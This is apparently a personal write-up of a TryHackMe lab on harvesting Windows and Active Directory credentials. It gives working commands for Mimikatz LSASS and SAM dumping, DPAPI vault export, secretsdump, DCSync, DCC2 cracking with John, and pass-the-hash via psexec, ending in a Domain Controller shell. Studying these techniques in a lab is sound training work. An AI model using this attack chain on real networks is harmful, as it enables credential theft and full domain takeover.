# Intro to Credential Harvesting

**Room Name:** Intro to Credential Harvesting
**Platform:** TryHackMe
**Date:** 24 June 2026

---

# Overview

Windows and Active Directory store credentials in multiple locations depending on authentication requirements, offline access needs, and application integrations.

For penetration testers, these credential stores represent valuable targets for credential harvesting, privilege escalation, and lateral movement.

This room covers the following credential stores:

* LSASS Memory
* SAM + SYSTEM Hives
* LSA Secrets
* DPAPI Vault
* NTDS.dit

The objective is to move from local administrator access on a domain-joined workstation (**WRK**) to obtaining remote shell access as a Domain Administrator on the Domain Controller (**DC**) and retrieve the flag from the Domain Admin's Desktop.

---

# Credential Stores

## 1. LSASS Memory

### Purpose

The Local Security Authority Subsystem Service (LSASS) manages authentication and enforces security policies.

### Stored Data

* NTLM hashes
* LM hashes
* Kerberos TGTs
* Service tickets
* Plaintext credentials (sometimes)

### Why It Exists

Provides Single Sign-On (SSO) functionality and authentication services.

### Access Requirements

SYSTEM or Administrator privileges.

### Mimikatz Commands

```text
privilege::debug
sekurlsa::logonpasswords
```

### Notes

LSASS is a primary target because it contains live credentials currently being used by the system.

---

## 2. SAM + SYSTEM Hives

### Purpose

Stores local account password hashes.

### Files

```text
%SystemRoot%\System32\Config\SAM
%SystemRoot%\System32\Config\SYSTEM
```

### Stored Data

* Local user NTLM hashes
* Local Administrator hashes

### Why It Exists

Provides authentication for local Windows accounts.

### Export Registry Hives

```powershell
reg save HKLM\SAM C:\Users\Administrator\Desktop\SAM

reg save HKLM\SYSTEM C:\Users\Administrator\Desktop\SYSTEM
```

### Dump Hashes with Mimikatz

```text
lsadump::sam /sam:SAM /system:SYSTEM
```

### Notes

The SYSTEM hive contains the BootKey required to decrypt hashes stored in the SAM database.

---

## 3. LSA Secrets

### Registry Location

```text
HKLM\SECURITY\Policy\Secrets
```

### Stored Data

* Cached domain credentials
* Service account passwords
* Scheduled task credentials
* RDP secrets

### Why It Exists

Supports:

* Offline domain logins
* Service authentication
* Scheduled task execution

### Access Requirements

Administrator or SYSTEM privileges.

### Tools

```text
secretsdump.py
```

### Notes

Many secrets may be stored in plaintext or be easily decrypted.

---

## 4. DPAPI Vault

### Purpose

Windows secure storage for application credentials.

### Stored Data

* Browser passwords
* Wi-Fi credentials
* Saved RDP credentials
* Application secrets

### Key Locations

```text
%APPDATA%\Microsoft\Protect
```

### DPAPI Vault Enumeration

```text
vault::list
```

### Extract Credentials

```text
vault::cred /export
```

### Notes

DPAPI master keys are protected using keys derived from the user's Windows password.

---

## 5. NTDS.dit

### Purpose

Active Directory database used on Domain Controllers.

### Stored Data

* Domain users
* Computer accounts
* Service principals
* NTLM hashes
* Kerberos keys

### Importance

Highest-value credential store in Active Directory environments.

### Extraction Methods

```text
secretsdump.py -just-dc
lsadump::dcsync
```

### Notes

Compromise of NTDS.dit effectively compromises the entire domain.

---

# Mimikatz Credential Harvesting

## Running Mimikatz

Launch Mimikatz as Administrator from the Desktop.

```text
mimikatz.exe
```

---

# DPAPI Credential Extraction

## List Vaults

```text
vault::list
```

Expected vaults:

* Windows Credentials
* Web Credentials

## Export Stored Credentials

```text
vault::cred /export
```

### Observation

Local Administrators can often decrypt user vault credentials because they have access to user profile files and DPAPI master keys.

However, service account credentials remain protected unless:

* The service account password is known
* The service account token is available
* The account is impersonated

---

# Dumping Local SAM Hashes

## Save Registry Hives

```powershell
reg save HKLM\SAM C:\Users\Administrator\Desktop\SAM

reg save HKLM\SYSTEM C:\Users\Administrator\Desktop\SYSTEM
```

## Dump Hashes

```text
lsadump::sam
```

### Result

Obtains local user password hashes for:

* Administrator
* Other local accounts

These hashes can be:

* Cracked offline
* Used in Pass-the-Hash attacks

---

# Extracting LSASS Credentials

## Enable Debug Privileges

```text
privilege::debug
```

Expected Output:

```text
Privilege '20' OK
```

## Dump Credentials

```text
sekurlsa::logonpasswords
```

### Extracted Information

* Plaintext passwords
* NTLM hashes
* Kerberos tickets
* User sessions

---

# Remote Credential Harvesting with Secretsdump

## Dump Credentials Using Local Administrator

Run from AttackBox:

```bash
secretsdump.py WRK/Administrator:N3w34829DJdd?1@10.220.10.20 -output local_dump
```

### Format

```text
Host/User:Password@Target_IP
```

### Output Includes

* Local SAM hashes
* LSA secrets
* Cached domain credentials (DCC2)

---

# Cracking DCC2 Hashes

## Hash Type

```text
MS-Cache v2 (DCC2)
```

### Purpose

Allows domain users to log in while offline.

### Crack Using John the Ripper

```bash
john --format=mscash2 dc2_hashes.txt \
--wordlist=/usr/share/wordlists/rockyou.txt
```

### Result

Recovered password for:

```text
drgonzo
```

### Limitation

DCC2 hashes cannot be used for Pass-the-Hash attacks.

Only offline cracking is possible.

---

# Dumping Domain Credentials from the DC

After obtaining Domain Admin credentials:

```bash
secretsdump.py TRYHACKME/drgonzo:PASSWORD@10.220.10.10 \
-just-dc \
-output dc_dump
```

### Option Explanation

```text
-just-dc
```

Performs DCSync extraction using the DRSUAPI protocol.

### Extracted Data

* Domain NTLM hashes
* Kerberos keys
* User account credentials

### Hash Format

```text
username:RID:LMHASH:NTHASH:::
```

---

# Pass-the-Hash with PsExec

After obtaining the Domain Administrator NTLM hash:

```bash
psexec.py 'TRYHACKME/Administrator@10.220.10.10' \
-hashes :NTHASH
```

### Benefits

No plaintext password required.

Authenticate directly using the NTLM hash.

### Result

Remote shell access on the Domain Controller.

---

# Credential Store Summary

| Store        | Contents                                       | Access Method            | Tools          |
| ------------ | ---------------------------------------------- | ------------------------ | -------------- |
| LSASS Memory | NTLM hashes, Kerberos tickets, plaintext creds | Memory dump              | Mimikatz       |
| SAM + SYSTEM | Local account hashes                           | Registry hive extraction | Mimikatz       |
| LSA Secrets  | Cached credentials, service passwords          | LSARPC                   | secretsdump.py |
| DPAPI Vault  | Browser, RDP, Wi-Fi credentials                | User vault access        | Mimikatz       |
| NTDS.dit     | Full domain credentials                        | DCSync / Offline parsing | secretsdump.py |

---

# Key Takeaways

1. LSASS contains live authentication material.
2. SAM and SYSTEM hives reveal local account hashes.
3. LSA Secrets expose cached credentials and service passwords.
4. DPAPI protects user application secrets but can often be decrypted with proper access.
5. NTDS.dit is the most valuable credential store in Active Directory.
6. DCSync allows attackers to retrieve domain credentials without directly accessing the database file.
7. Pass-the-Hash enables authentication without knowing plaintext passwords.

---

# Objective Achieved

Attack Path:

```text
Local Administrator (WRK)
        ↓
Harvest Credentials
        ↓
Obtain Cached Domain Credentials
        ↓
Crack DCC2 Hash
        ↓
Gain Domain Admin Credentials
        ↓
DCSync with secretsdump
        ↓
Obtain Domain Admin NTLM Hash
        ↓
Pass-the-Hash via PsExec
        ↓
Remote Shell on Domain Controller
        ↓
Retrieve Flag
```
